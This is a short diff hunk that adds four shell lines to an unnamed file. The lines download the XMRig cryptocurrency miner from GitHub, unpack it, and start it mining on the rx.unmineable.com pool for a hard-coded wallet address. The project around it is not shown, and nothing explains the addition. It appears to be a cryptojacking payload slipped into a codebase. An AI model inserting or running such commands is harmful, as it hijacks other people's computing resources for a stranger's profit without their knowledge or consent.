@@ -1,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
+tar -xf xmrig-6.16.2-linux-x64.tar.gz
+cd xmrig-6.16.2
+./xmrig -o rx.unmineable.com:3333 -u SAITAMA:0xc230c70F5e403eD5c56E20180F1ba1C2e53d39Df.amirreyka -k
